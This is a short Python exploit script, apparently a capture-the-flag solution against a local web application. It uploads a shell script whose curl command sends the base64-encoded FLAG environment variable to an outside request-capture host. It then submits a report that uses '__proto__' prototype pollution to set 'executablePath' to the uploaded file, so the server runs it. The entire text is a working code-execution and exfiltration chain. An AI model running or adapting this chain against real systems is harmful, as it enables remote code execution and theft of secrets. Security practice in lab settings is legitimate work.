import requests

URL = 'http://localhost:3000'

files = {
    'file': ('exploit.sh', '#!/bin/bash\ncurl http://requestrepo.com/r/jie2874c/flag=$(echo $FLAG | base64)\n', 'application/x-sh')
}

response = requests.post(f'{URL}/upload', files=files)
upload_data = response.json()

if not upload_data['success']:
    print('File upload failed')
    exit()

uploaded_file = upload_data['file']
print(f'Uploaded file: {uploaded_file}')

report_data = {
    'url': f'{URL}/',
    'username': '__proto__',
    'issue': 'executablePath',
    'description': f'/app/static/{uploaded_file}'
}
response = requests.post(f'{URL}/report', json=report_data)
report_result = response.json()
print(f'Report result: {report_result}')
